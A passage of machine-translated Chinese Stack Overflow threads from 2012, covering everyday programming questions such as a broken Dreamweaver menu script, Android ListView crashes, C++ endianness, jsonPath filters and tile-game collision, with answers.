    mm_menu_0327091831_0.addMenuItem("BRAD&nbsp;R.&nbsp;WRIGHT,&nbsp;P.L.L.C.","location='brad-wright.html'");
    mm_menu_0327091831_0.hideOnMouseOut=true;
    mm_menu_0327091831_0.bgColor='#555555';
    mm_menu_0327091831_0.menuBorder=1;
    mm_menu_0327091831_0.menuLiteBgColor='#FFFFFF';
    mm_menu_0327091831_0.menuBorderBgColor='#777777';

    mm_menu_0327091831_0.writeMenus();
} // mmLoadMenus()
//-->​​​​​
</script> 
```

这是之后的代码：

```
<script language="JavaScript">
<!--
function mmLoadMenus() {
    if (window.mm_menu_0327091831_0) return;

    window.mm_menu_0327091831_0 = new Menu("root",225,30,"Optima, Verdana, Helvetica Neue, sans-serif",14,"#FFFFFF","#FFFFFF","#7E7D7D","#B3B3B3","left","middle",8,0,250,-5,7,true,false,true,0,true,true);

    mm_menu_0327091831_0.addMenuItem("HARRY&nbsp;GRIFF,&nbsp;P.C.","location='harry-griff.html'");
    mm_menu_0327091831_0.addMenuItem("DOUGLAS&nbsp;E.&nbsp;LARSON,&nbsp;P.C.","location='doug-larson.html'");
    mm_menu_0327091831_0.addMenuItem("STEPHEN&nbsp;L.&nbsp;LAICHE,&nbsp;P.C.","location='stephen-laiche.html'");
    mm_menu_0327091831_0.addMenuItem("BRAD&nbsp;R.&nbsp;WRIGHT,&nbsp;P.L.L.C.","location='brad-wright.html'");
    mm_menu_0327091831_0.addMenuItem("BRAD&nbsp;R.&nbsp;WRIGHT,&nbsp;P.L.L.C.","location='rob-zentner.html'");
    mm_menu_0327091831_0.hideOnMouseOut=true;
    mm_menu_0327091831_0.bgColor='#555555';
    mm_menu_0327091831_0.menuBorder=1;
    mm_menu_0327091831_0.menuLiteBgColor='#FFFFFF';
    mm_menu_0327091831_0.menuBorderBgColor='#777777';

    mm_menu_0327091831_0.writeMenus();
} // mmLoadMenus()​​​​
//-->
</script> 
```

继承人正在工作的网站：

[第一个站点（这是有效的，但是需要一些更新的页面](http://www.gllblaw.com/)

这是不工作的网站：

[第二个站点（这不起作用，将鼠标悬停在律师个人资料按钮上）](http://users.acsol.net/~jhart/index.html)

我刚刚粘贴了已更改的 javascript，因为我认为这就是问题所在，但如果需要，我可以发布更多内容。

感谢大家的帮助！

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-10-01T22:37:24.173

您有 2 个不同版本的`mm_menu.js`. 其中一个有语法错误。注意 StackOverflow 在下面 2 个片段上突出显示的语法。

[http://www.glllblaw.com/mm_menu.js](http://www.gllblaw.com/mm_menu.js)（好版本）

```
/**
 * mm_menu 20MAR2002 Version 6.0
 * Andy Finnell, March 2002
 * Copyright (c) 2000-2002 Macromedia, Inc.
 *
 * based on menu.js
 * by gary smith, July 1997
 * Copyright (c) 1997-1999 Netscape Communications Corp.
 *
 * Netscape grants you a royalty free license to use or modify this
 * software provided that this copyright notice appears on all copies.
 * This software is provided "AS IS," without a warranty of any kind.
 */
function Menu(label, mw, mh, fnt, fs, fclr, fhclr, bg, bgh, halgn, valgn, pad, space, to, sx, sy, srel, opq, vert, idt, aw, ah) 
{
   // code here... 
```

[http://users.acsol.net/~jhart/mm_menu.js](http://users.acsol.net/~jhart/mm_menu.js)（坏版本）

```
/**
 * mm_menu 20MAR2002 Version 6.0
 * Andy Finnell, March 2002
 * Copyright (c) 2000-2002 Macromedia, Inc.
 *
/
function Menu(label, mw, mh, fnt, fs, fclr, fhclr, bg, bgh, halgn, valgn, pad, space, to, sx, sy, srel, opq, vert, idt, aw, ah) 
{
   // code here... 
```

看到问题了吗？在不良版本顶部的标题中，评论没有正确关闭。多行 Javascript 注释以 . 开头`/*`和结尾`*/`。然而，这个标题评论被破坏了，它没有结束评论标记。所以整个文件被注释掉并且`Menu`不存在。

正确关闭该评论，我敢打赌一切都会好起来的。

* * *

所以你知道如何自己成为一个更好的开发者，这就是我的想法。

我只是在 Chrome 中打开了开发者工具，然后查看了 JS 控制台。在哪里，在鲜红色的地方，我看到了这个：

![JS 控制台](../Images/c46ce854b2f5026719e75855c6fa50cc.png)

它立即告诉我语法错误，以及错误所在的文件和近似行。查看文件，然后看到 Chrome 语法突出显示整个文件的样式，就像注释（绿色）一样，很明显发生了什么。

# ios - 如何在多个视图中重用相同的 UIButton

> ID：12648824
> 
> 赞同：0
> 
> 时间：2012-09-29T00:15:22.227
> 
> 标签：ios, uibutton

我创建了一个这样的按钮：

```
UIButton *toTop = [UIButton buttonWithType:UIButtonTypeCustom];
toTop.frame = CGRectMake(12, 12, 37, 38);
toTop.tintColor = [UIColor clearColor];
[toTop setBackgroundImage:[UIImage imageNamed:@"toTop.png"] forState:UIControlStateNormal];
[toTop addTarget:self action:@selector(scrollToTop:) forControlEvents:UIControlEventTouchUpInside]; 
```

我有各种 UIView，我想一遍又一遍地使用同一个按钮，但我做不到。我尝试将相同的内容添加`UIButton`到多个视图中，但它总是出现在我添加它的最后一个位置。我也试过：

```
UIButton *toTop2 = [[UIButton alloc] init];
toTop2 = toTop; 
```

这是行不通的。有没有一种有效的方法可以做到这一点，而无需一遍又一遍地为同一个按钮设置所有相同的属性？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-29T00:21:35.417

`UIView`s 只能有一个超级视图。使用第二种方法，您只需分配一个按钮，然后将其丢弃并指定其指针指向第一个按钮。所以现在`toTop`两者`toTop2`都指向完全相同的按钮实例，你又回到了单一的超级视图限制。

因此，您需要创建单独`UIButton`的实例来完成此操作。在不重复代码的情况下做到这一点的一种方法是编写一个类别。像这样的东西应该工作：

UIButton+ToTopAdditions.h：

```
@interface UIButton (ToTopAdditions)

+ (UIButton *)toTopButtonWithTarget:(id)target;

@end 
```

UIButton+ToTopAdditions.m:

```
@implementation UIButton (ToTopAdditions)

+ (UIButton *)toTopButtonWithTarget:(id)target
{
    UIButton *toTop = [UIButton buttonWithType:UIButtonTypeCustom];
    toTop.frame = CGRectMake(12, 12, 37, 38);
    toTop.tintColor = [UIColor clearColor];
    [toTop setBackgroundImage:[UIImage imageNamed:@"toTop.png"] forState:UIControlStateNormal];
    [toTop addTarget:target action:@selector(scrollToTop:) forControlEvents:UIControlEventTouchUpInside];
    return toTop;
}

@end 
```

Import `UIButton+ToTopAdditions.h`，将适当的目标传递给方法（听起来就像`self`你的情况），你会得到尽可能多的相同按钮。希望这可以帮助！

# android - 我的 Android 中的 ListView

> ID：12648829
> 
> 赞同：0
> 
> 时间：2012-09-29T00:16:04.500
> 
> 标签：android, android-layout, listview, android-activity, android-listview

我已经尝试做一个。列表显示。但它不会起作用。我在主要活动中单击此按钮，它崩溃了。

```
<Button
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:text="Coming Soon: Expansion View"
    android:onClick="exp"
    /> 
```

这是主要活动 JAVA 代码。这只是我正在开发的游戏的简单主菜单内容。这太疯狂了。

```
 package com.apw.games.rpg.medieval;

import android.app.*;
import android.os.*;
import android.view.*;
import android.widget.*;
import android.content.*;
import android.util.*;
import android.graphics.*;

public class MainActivity extends Activity
{

/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState)
{
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
    AlertDialog alertDialog = new 
    AlertDialog.Builder(MainActivity.this).create();
    alertDialog.setTitle("Medieval: The Video Game");
    alertDialog.setMessage("All Games Begin. Season One of the Game, Version 1\. First Expansion coming soon- Life of Darkness.");
    alertDialog.setButton("OK", new DialogInterface.OnClickListener() { 
    public void onClick(DialogInterface dialog, int which) {

//here you can add functions

            } });
    alertDialog.setIcon(R.drawable.medieval_background);
    alertDialog.show();
}

@Override
public void exp(View v) {
    Intent 
        intt = new Intent(this, Expansions.class);
    startActivity(intt);
}

@Override 
public void onNothingSelected(AdapterView<?> parent) {

 }
@Override 
public boolean onCreateOptionsMenu(Menu menu) { 
MenuInflater inflater = getMenuInflater(); 
inflater.inflate(R.menu.menu, menu); return true; }

@Override 
public boolean onOptionsItemSelected(MenuItem item) { 
// Handle item selection 
switch (item.getItemId()) { 

    case R.id.quit: 
    Intent intent =  new Intent(this, Exit.class); 
    startActivity(intent); 
    return true; 
    case R.id.new_game: 
        Intent i = new Intent(this, New_Game.class); 
        startActivity(i); 
        return true; 
    case R.id.visit_site: 
        Intent inte = new Intent(this, Site.class); 
        startActivity(inte); 
        return true; 
    case R.id.apw_site: 
        Intent inten = new Intent(this, APWSite.class); 
        startActivity(inten); 
        return true; 

    default: return super.onOptionsItemSelected(item);

    }}} 
```

这是列表视图中的布局内容。此外，所有这些都来自我从 StackOverflow 上的某个人那里得到的教程，所以只是为了让你知道。第一个称为 simplerow.xml

```
 <TextView xmlns:android="http://schemas.android.com/apk/res/android"
 android:id="@+id/rowTextView" 
 android:layout_width="fill_parent" 
 android:layout_height="wrap_content"
 android:padding="10dp"
 android:textSize="16sp" >
</TextView> 
```

现在这里是另一个名为expansions.xml 的文件。通过这些“R.layout”文件使用的 java 代码将在后面发布。

```
 <?xml version="1.0" encoding="utf-8"?>
<LinearLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/list_view"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical"
    >
<ListView
android:id="@+id/list_view"
android:layout_width="fill_parent"
android:layout_height="fill_parent">
</ListView>
</LinearLayout> 
```

现在这里是“大满贯”Java 文件，我不确定发生了什么，因为除此之外，我是在 Android 上做这一切的，所以你知道。我的助手说没有错误，但是当我启动应用程序并单击主活动中的按钮时，它崩溃了。我不确定这是 onClick 问题还是其他问题。

```
 package com.apw.games.rpg.medieval;

import java.util.ArrayList;
import java.util.Arrays;

import android.app.Activity;
import android.os.Bundle;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import com.apw.games.rpg.medieval.*;

public class Expansions extends Activity {

  private ListView mainListView ;
  private ArrayAdapter<String> listAdapter ;

  /** Called when the activity is first created. */
  @Override
  public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.expansions);

    // Find the ListView resource. 
    mainListView = (ListView) findViewById( R.id.list_view );

    // Create and populate a List of planet names.
    String[] planets = new String[] { "Mercury", "Venus", "Earth", "Mars",
                                  "Jupiter", "Saturn", "Uranus", "Neptune"};  
    ArrayList<String> planetList = new ArrayList<String>();
    planetList.addAll( Arrays.asList(planets) );

    listAdapter = new ArrayAdapter<String>(this, R.layout.simplerow, planetList);

    // Add more planets. If you passed a String[] instead of a List<String> 
    // into the ArrayAdapter constructor, you must not add more items. 
    // Otherwise an exception will occur.
    listAdapter.add( "Ceres" );
    listAdapter.add( "Pluto" );
    listAdapter.add( "Haumea" );
    listAdapter.add( "Makemake" );
    listAdapter.add( "Eris" );

    mainListView.setAdapter( listAdapter );      
  }
} 
```

如果可能的话，请告诉我我的错误在哪里，并请帮助我纠正它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T04:10:33.557

将此用于 xml 布局：

```
 <ListView android:id="@+id/ListView1" android:layout_width="fill_parent"
       android:layout_height="wrap content" /> 
```

以下代码：

```
 public static String selected = "";
         private static final String[] RATINGS = new String[] {
    "1","2","3","4","5"
};

    ListView list = (ListView)findViewById(R.id.ListView1);

          list.setAdapter(new ArrayAdapter<String>(this,
            android.R.layout.simple_list_item_single_choice, RATINGS));
    list.setChoiceMode(ListView.CHOICE_MODE_SINGLE);
    list.setOnItemClickListener(new OnItemClickListener() {

        @Override
        public void onItemClick(AdapterView<?> arg0, View arg1, int arg2,
                long arg3) {

            selected = RATINGS[arg2];               
        }
    }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T04:44:40.777

我认为这是你的问题：

```
listAdapter = new ArrayAdapter<String>(this, R.layout.simplerow, planetList); 
```

您是在告诉适配器要使用哪个布局，而不是告诉适配器要将数据映射到布局中的哪个元素。由于您使用的是自定义 TextView 名称，因此您需要告诉适配器。

使用您尝试使用的构造函数会使适配器查找默认的 TextView id `text1`。

所以，你有一个选择。您可以使用提供资源文件和 TextView id 的不同构造函数。

如果你这样做，它应该看起来像这样：

```
listAdapter = new ArrayAdapter<String>(this, R.layout.simplerow, R.id.rowTextView, planetList); 
```

或者，您可以将 TextView 的 id 更改为`text1`并将您的呼叫原样保留给适配器。

有关可用于调用适配器的所有各种构造函数的列表，请参阅[ArrayAdapter 文档。](http://developer.android.com/reference/android/widget/ArrayAdapter.html#ArrayAdapter)

# c++ - 二进制读取、reinterpret_cast 和字节序

> ID：12648834
> 
> 赞同：1
> 
> 时间：2012-09-29T00:17:29.647
> 
> 标签：c++, binaryfiles, endianness, reinterpret-cast

我目前正在处理与字节序相关的问题。

假设我在大端系统中有一个大端文件。

此文件中的第一个值`2882400152 = 0xABCDEF98`是整数 4。

要读取整数 4 中的值`_myint4`，我只需执行以下操作：

```
mystream.read(reinterpret_cast<char*>(&_myint4), sizeof(_myint4)) 
```

问题是：读取文件中的整数 4 值，整数 8 等价于`_myint8`什么？

*   对于大端文件和系统？
*   对于小端文件和系统？

我的第一个猜测是这样的：

```
mystream.read((reinterpret_cast<char*>(&_myint8))+4, 4); // big-endian file/system
mystream.read(reinterpret_cast<char*>(&_myint8), 4); // little-endian file/system 
```

但我完全不确定。这样做的好方法是什么？

重要提示：我不能使用临时整数 4 值，我需要直接读取 4 中的整数 4 `_myint8`。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T04:18:54.460

你的猜测似乎是正确的：

```
_myint8 = 0;
mystream.read((reinterpret_cast<char*>(&_myint8))+4, 4); // big-endian file/system
mystream.read(reinterpret_cast<char*>(&_myint8), 4); // little-endian file/system 
```

要自己弄清楚字节顺序，在 Python 中玩一点可能会有所帮助：

```
>>> import struct
>>> struct.pack(">Q", 0xabcdef98)    // Big-endian 8-byte int.
'\x00\x00\x00\x00\xab\xcd\xef\x98'   // Its layout in memory.
>>> struct.pack(">I", 0xabcdef98)    // Big-endian 4-byte int.
'\xab\xcd\xef\x98'

>>> struct.pack("<Q", 0xabcdef98)    // Little-endian 8-byte int.
'\x98\xef\xcd\xab\x00\x00\x00\x00'
>>> struct.pack("<I", 0xabcdef98)    // Little-endian 4-byte int.
'\x98\xef\xcd\xab' 
```

所以你是对的，你只需要确保你在内存中没有覆盖的地方有零。

# ruby-on-rails - 使用 Capybara 检查多个页面上的页面响应

> ID：12648839
> 
> 赞同：1
> 
> 时间：2012-09-29T00:18:09.413
> 
> 标签：ruby-on-rails, ruby, capybara

我正在使用 Capybara 和 Ruby on Rails 创建一个集成测试，该测试将填写所有字段并提交表单。然后，这会将新页面加载到浏览器。是否有可能在测试中获得第二页的响应？

```
describe "the signup process", :type => :request do
    it "signs me in" do
      visit sign_up_path
      fill_in 'user_first_name', :with => "Jhonny"
      t1 = Time.new
      fill_in 'user_email', :with => "joe412@offerslot.com"
      fill_in 'user_last_name', :with => "Bravo"
      fill_in 'user_zip_code', :with => "94102"
      fill_in 'user_password', :with => "password1234"

      click_button 'user-button'
      response.should be_success 
      response.body should_contain("Text on next page")
    end
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T01:32:07.623

如果您使用 capybara `visit`，则无法访问响应状态，因为 capybara 不提供该信息。如果您想分析响应状态，您必须使用正常的 HTTP 请求动词（即`get`等`post`），但这些不会适用于您描述的情况，因为您的测试涉及多个页面。

（`visit`vs的使用`get`是一个常见的混淆点。有关详细信息，请参阅José Valim 的[这篇文章](http://blog.plataformatec.com.br/2012/06/improving-the-integration-between-capybara-and-rspec/)。）

所以基本上，答案是：不要在集成测试中测试响应状态。

但无论如何，你不应该真的这样做。集成测试旨在测试用户实际看到的内容，即浏览器中出现的内容。您不会“看到”响应状态，您看到的是实际页面以及其中的任何内容，因此这确实是您应该测试的内容。在上面的测试中，这就是您对 line 所做的事情`response.body should_contain("Text on next page")`。这足以确保响应成功。

如果您想测试应用程序的专门类似于 API 的方面，那么我建议为此使用 rspec 请求规范（本质上是集成测试，但专注于一步请求/响应。）您可以使用`get`请求并分析使用水豚匹配器的响应。

# angularjs - 来自 $resource 的异步数据指令没有正确初始化

> ID：12648842
> 
> 赞同：0
> 
> 时间：2012-09-29T00:19:08.730
> 
> 标签：angularjs

我正在尝试创建一个简单的轮播。源图像通过`$resource`。我需要一种通知数据已更改的监视表达式。一旦我有了这些数据，我需要使用位于 ng-model 属性中的数组中包含的第一张照片来初始化图库。

编码：

```
app.directive('ngCarousel', function() {

    var template =  //...;

    return {
        restrict: 'E',
        require: 'ngModel',
        scope: {data:'='},
        compile:function(tElement, tAttrs, transclude) {
            tElement.html(template);

            //...

            return function(scope, element, attrs, ctrl) {

                //...

                attrs.$watch(scope.$modelValue, function() {
                    //initialize the template
                })
            }
        }
    }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-12T18:22:42.767

> 我需要一种通知数据已更改的监视表达式。

向您的 $resource 查询添加回调。即，而不是（我在这里猜测，因为您没有提供任何代码来显示您如何使用 $resource）

```
$scope.image1 = MyResourceWrapper.query() 
```

改为这样做：

```
MyResourceWrapper.query( function(data) {
   // Now you know the data has arrived.  Initialize your gallery, etc.
   ...
} 
```

* * *

另见[http://angular-ui.github.com/bootstrap/#/carousel](http://angular-ui.github.com/bootstrap/#/carousel)

# ios - 无法使用带有 3.1 SDK 的本机 iOS 6 登录获取新的访问令牌

> ID：12648844
> 
> 赞同：3
> 
> 时间：2012-09-29T00:19:12.687
> 
> 标签：ios, facebook, facebook-ios-sdk

> **可能重复：**
> [Facebook SDK 3.1 - 验证访问令牌时出错](https://stackoverflow.com/questions/12601191/facebook-sdk-3-1-error-validating-access-token)

在我的应用程序中，我有一个删除帐户选项。使用时，它会告诉我们的服务器删除该帐户，并从用户的 App Center 中删除该应用程序。我也调用 [[FBSession activeSession] closeAndClearTokenInformation]。即使我删除了 iOS 应用程序并重新安装它，我也会继续获得旧的访问令牌，这显然不起作用，因为 Facebook 应用程序甚至不再存在。当我通过新的 SDK 在 iOS 6 中使用本机登录时，就会发生这种情况。我可以获得新/工作令牌的唯一方法是进入 Settings.app 并禁用 Facebook 对我的应用程序的访问，然后重新启用它。那时我终于得到了一个新的令牌（以及询问用户是否要授予应用程序打开权限的警报）。

我怎样才能真正清除/重置 iOS 持有的令牌？

# java - 如何在 Java 中使用 Bing 搜索 API

> ID：12648847
> 
> 赞同：4
> 
> 时间：2012-09-29T00:19:45.280
> 
> 标签：java, bing

我需要从 Bing 中提取搜索结果。是否有任何可用的 Java 代码来实现这一点？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-16T02:27:02.910

[这个 MSDN 论坛主题](http://social.msdn.microsoft.com/Forums/en-US/DataMarket/thread/f93738b4-b4eb-4f8a-83c6-6f97c66cd2fb/)有很多答案和示例。

此外，当您在 Azure 上购买或订阅数据集时，他们有一个 java 示例。这是一个例子

> 转到[odata4j](http://code.google.com/p/odata4j/)站点并下载最新版本。
> 
> 将 odata4j-clientbundle-xxjar 添加到您的 Java 构建路径。
> 
> 您可以使用以下代码调用该服务。

```
ODataConsumer c = ODataConsumers
    .newBuilder("https://api.datamarket.azure.com/Data.ashx/Bing/Search/v1/")
    .setClientBehaviors(OClientBehaviors.basicAuth("accountKey", "{your account key here}"))
    .build();

OQueryRequest<OEntity> oRequest = c.getEntities("Web")
    .custom("Query", "stackoverflow bing api");

Enumerable<OEntity> entities = oRequest.execute(); 
```

# javascript - 不确定 JQuery 是否被包含...检查方法？

> ID：12648848
> 
> 赞同：0
> 
> 时间：2012-09-29T00:19:52.800
> 
> 标签：javascript, jquery

我在我的站点中包含 JQuery 并引用之后将使用 Jquery 的外部脚本。但是，我不认为它们是作为 Jquery 运行的，它们只是失败了......我的 HTML 看起来像这样：

```
 <script type="text/javascript" src="lib/jquery/jquery-1.4.2.min.js"></script>
    <script type="text/javascript" src="lib/load.js"></script>
    <script type="text/javascript" src="lib/logErr.js"></script> 
```

在头部。load.js 包含： $('body').css('background-color','black'); 但不起作用。当我将其切换到状态时： alert('Hey'); 使用简单的 Javascript，它确实有效。所有文件都可以工作。请问有什么建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-29T00:22:46.977

第一个选项只需在 DOM 就绪事件中发出警报

```
$(function() {
    alert('jQuery Loaded !!');
}); 
```

第二个选项是在浏览器中按 F12 并在脚本部分检查 jQuery 文件。如果 jQuery 加载正确，那么您可以在其中看到脚本文件..

**编辑** 在我看来像文件引用错误.. 为什么不使用由 Google CDN 托管的 jQuery

将此包含在您的标题部分而不是您正在使用的 jQuery 文件中

```
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T00:23:27.890

您是否尝试将其包装在加载事件中？

```
$(function() {
    $('body').css('background-color','black');
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-29T00:26:56.237

如果没有更多信息，很难说您遇到了什么问题。

当您使用 Firefox 时，请尝试使用 Firebug 及其集成控制台。控制台将为您提供有关 JQuery 是否已成功加载或代码中的错误的更多详细信息。

在 Chrome 中，您可以使用带有集成控制台的开发人员工具。

不要使用警报来记录脚本的状态，而是使用控制台：

```
console.log('Hey'); // Will print 'Hey' in the console.
console.log(some_variable); // Will print variable content and information. 
```

使用具体的控制台错误消息和您的代码，它会更容易帮助您。

此外，您可以使用上述两种工具来跟踪您的网络并查看脚本是否正确加载。所以你会知道 JQuery 是否被加载。

# c# - 当我的 C# 项目也需要 MDW 文件时，如何将 Access DB 添加到我的项目中？

> ID：12648853
> 
> 赞同：1
> 
> 时间：2012-09-29T00:21:28.883
> 
> 标签：c#, database, ms-access

我想在我的 C# 项目中使用 Access 数据库文件。当我将它添加为新的数据源时，一切顺利，直到我尝试测试连接。然后我收到消息：

```
Cannot start your application. The workgroup information file is missing or opened exclusively by another user. 
```

该文件受密码保护并使用 MDW 文件。那么如何将文件添加为数据源并同时使用工作组信息文件呢？

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-29T00:26:45.200

以下是指定 .MDW 文件所在位置的示例连接字符串：

```
Provider=Microsoft.Jet.OLEDB.4.0;Data Source=C:\mydatabase.mdb;
    Jet OLEDB:System Database=system.mdw;User ID=myUsername;Password=myPassword; 
```

# javascript - 带有电子邮件地址的 jsonPath 过滤器表达式

> ID：12648856
> 
> 赞同：2
> 
> 时间：2012-09-29T00:21:45.717
> 
> 标签：javascript, jsonpath

在 jsonPath 我试图过滤具有多个值的对象。一个可能的值是电子邮件地址。由于 @ 用作指向当前对象的指针，因此它失败了。

示例 json 字符串

```
{
"report": {
    "Author": [
        {
            "value": "John",
            "count": "58",
            "fields": [
                {
                    "key": "FileSize",
                    "value": "12314"

                },
                {
                    "key": "Date",
                    "value": "2000-01-01"
                }
            ]
        },
        {
            "value": "Jane",
            "count": "1",
            "fields": [
            ]
        },
        {
            "value": "Foo@bar.com",
            "count": "58",
            "fields": [
                {
                    "key": "FileSize",
                    "value": "12314"

                },
                {
                    "key": "Date",
                    "value": "2000-01-01"
                },
                {
                    "key": "tags",
                    "value": "a,b,c,d"
                }         
            ]
        },
        {
            "value": "Bill",
            "count": "2",
            "fields": [
                {
                    "key": "FileSize",
                    "value": "14"

                }
            ]
        }
    ]
}
} 
```

如果你使用

```
$.report.Author[?(@.value==='John')] 
```

结果是

```
"[{"value":"John","count":"58","fields":[{"key":"FileSize","value":"12314"},{"key":"Date","value":"2000-01-01"}]}]" 
```

但由于电子邮件地址有一个 @ 符号 jsonPath 返回 false

```
$.report.Author[?(@.value==='Foo@bar.com')] 
```

任何人都知道逃避@符号的方法或评估对象的不同方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-28T11:59:22.603

这对我有用：

```
$.report.Author[?(@.value==='Foo\\u0040bar.com')] 
```

我使用带有这个[jsonpath 库的](https://npmjs.org/package/JSONPath)[nodejs](http://nodejs.org/)对其进行了测试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-04T13:18:55.103

您可以使用 DefiantJS 并在 JSON 结构上编写 XPath。在您的 JSON 上试用 lib 并测试 XPath：http:
[//defiantjs.com/#xpath-evaluator](http://defiantjs.com/#xpath-evaluator)

我已经粘贴了你的 json 数据并测试了这个 XPath，它可以工作：

```
//Author[value="Foo@bar.com"] 
```

DefiantJS 用新方法扩展了全局对象 JSON；“搜索” - 它返回一个数组，在 javascript 中，它看起来像这样：

```
var author = JSON.search(json_data, "//Author[value="Foo@bar.com"]");

console.log( author[0].value );
// Foo@bar.com

console.log( author[0].count );
// 58 
```

# java - JavaMail 类型不匹配：无法从 MimeBodyPart 转换为 BodyPart

> ID：12648857
> 
> 赞同：0
> 
> 时间：2012-09-29T00:21:47.780
> 
> 标签：java, eclipse, jakarta-mail

使用以下代码时出现错误：

```
BodyPart messageBodyPart = new MimeBodyPart(); 
```

我已经阅读了文档并且 MimeBodyPart 实现了 BodyPart 接口，那么给出了什么？我正在使用 Java7、JavaMail 1.4.5 和 Eclipse Juno。

有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T00:24:16.800

根据[文档](http://javamail.kenai.com/nonav/javadocs/)，`MimeBodyPart`仅实现`MimePart`和`Part`（`MimePart`扩展`Part`）。此外，`BodyPart`甚至似乎都不是接口。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T20:44:00.113

完全是我的坏 - 我对“BodyPart”的导入错误，所以继承不正确。感谢大家的帮助

# css - 仅在 HTML 电子邮件中为桌面客户端指定 CSS

> ID：12648858
> 
> 赞同：0
> 
> 时间：2012-09-29T00:22:07.163
> 
> 标签：css, html-email

我正在尝试包含只会影响桌面电子邮件客户端而不影响移动电子邮件客户端的 CSS。

在下面的示例中，我为所有客户端添加了 CSS，然后尝试使用仅适用于最大宽度为 480 像素媒体查询的移动客户端的 CSS 声明来覆盖它。

我也尝试过使用`@media screen and (min-width: 800px)`，但我们正在测试的所有电子邮件客户端似乎都忽略了这一点。

然而，当我在 Litmus 中测试电子邮件时，所有电子邮件客户端，甚至是基于桌面的电子邮件客户端，都以 100% 宽度而不是 500px 显示表格

```
table[id="socialTbl"] {
    width: 500px !important;
    max-width: 500px !important;
}

table[id="locations"] {
    width: 500px !important;
    max-width: 500px !important;
}

/* Desktops and laptops ----------- */
@media only screen 
and (max-width : 480px) {
/* Styles */

table[id="socialTbl"] {
    width: 100% !important;
    max-width: 100% !important;
}

table[id="locations"] {
    width: 100% !important;
    max-width: 100% !important;
}
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-03T13:43:17.453

对于您的桌面客户端，所有 CSS 都需要内联，媒体查询仅适用于您的移动设备。

这是对 Campaign Monitor 流程的一个非常好的概述 - [http://www.campaignmonitor.com/guides/mobile/](http://www.campaignmonitor.com/guides/mobile/)

# java - 如何在基于 tile 的 Android 游戏中检查碰撞？

> ID：12648868
> 
> 赞同：1
> 
> 时间：2012-09-29T00:23:07.507
> 
> 标签：java, android

如何在基于图块的游戏中检查碰撞？我查看了 android SDK 的示例，但我无法理解它们，因为我是 Android 编程新手。

这是我的英雄学习的地图和瓷砖类，所以我可以在世界各地移动他

```
 class Map{
    int X = 0;
    int Y = 0; 
    int tileSize = 30;

    int [][]map= {
            //0 = empty tile
            //1 = wall
            //2 = player
            {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1},
            {1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1},
            {1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1},
            {1,0,0,0,0,0,1,1,2,1,1,0,0,0,0,0,1},
            {1,0,0,0,0,1,1,1,1,1,1,1,0,0,0,0,1},
            {1,0,0,0,0,1,1,1,1,1,1,1,0,0,0,0,1},
            {1,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,1},
            {1,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,1},
            {1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1},
            {1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1},
            {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1},
            };

    ArrayList<Tile> tiles = new ArrayList<Tile>();;

    public Map(){
        loadArray();
    }

    public void loadArray(){

        for(int xTiles = 0; xTiles< map.length; xTiles++ ){
            for(int yTiles = 0; yTiles< map[xTiles].length; yTiles++){
                if(map[xTiles][yTiles]==1){//Wall
                tiles.add(new Tile(X, Y, tileSize, map[xTiles][yTiles]));
                tiles.get(tiles.size()-1).setColor(Color.GRAY);
                tiles.get(tiles.size()-1).walkable = false;
                X+=tileSize;
                }else if(map[xTiles][yTiles]==0){//Empty Tile
                    tiles.add(new Tile(X, Y, tileSize, map[xTiles]      [yTiles]));
                X+=tileSize;
                }else if(map[xTiles][yTiles]==2){//Player 
                    tiles.add(new Tile(X, Y, tileSize, map[xTiles][yTiles]));
                X+=tileSize;    
                }
            }
            Y+=tileSize;
            X=0;
            }
        }

    public void drawMap(Canvas canvas){
    for(int index = 0; index < tiles.size(); index++){
        tiles.get(index).drawTile(canvas);
    }
}

}

    class Tile{
    private int type;
    int X;
    int Y;
    int size;
    boolean walkable = true;
    Paint color = new Paint();;
    //rect for the bounds
    Rect bounds = new Rect();

    public Tile(){
        type = 0;
        X = 0;
        Y = 0;
        size = 0;
        color.setColor(Color.TRANSPARENT);
        bounds.set(X, Y, X+size, Y+size);

    }

    public Tile(int X, int Y , int tileSize, int type){
        this.type = type;
        this.X = X;
        this.Y = Y;
        size = tileSize;
        color.setColor(Color.TRANSPARENT);
        bounds.set(X, Y, X+size, Y+size);
    }

    public int getX() {
        return X;
    }

    public int getY() {
        return Y;
    }

    public void setX(int x) {
        X = x;
    }

    public void setY(int y) {
        Y = y;
    }

